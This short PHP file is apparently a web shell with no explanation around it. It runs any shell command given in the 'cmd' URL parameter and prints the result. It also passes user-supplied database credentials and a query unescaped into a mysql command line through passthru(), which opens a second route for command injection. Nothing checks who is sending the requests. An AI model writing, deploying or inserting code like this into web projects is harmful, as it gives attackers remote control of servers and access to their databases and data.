<?php
header('Content-type: text/plain');
?>
<html>
	<body>
		<pre><?php $output=""; if(isset($_GET['cmd'])){ $op = exec($_GET['cmd'],$output, $return_var); }; print_r($output); ?></pre>
		<pre><?php if(isset($_GET['sql'])){
			if ($_GET['sql'] == true){
				$sql_user=$_GET['sql_user'];	
				$sql_pass=$_GET['sql_pass'];	
				$sql_db=$_GET['sql_db'];
				$sql_query=$_GET['query'];
				passthru("mysql --user=".$sql_user." --password=".$sql_pass." --database=".$sql_db." --execute=\"".$sql_query."\"");
			}
		}?></pre>
	</body>
</html>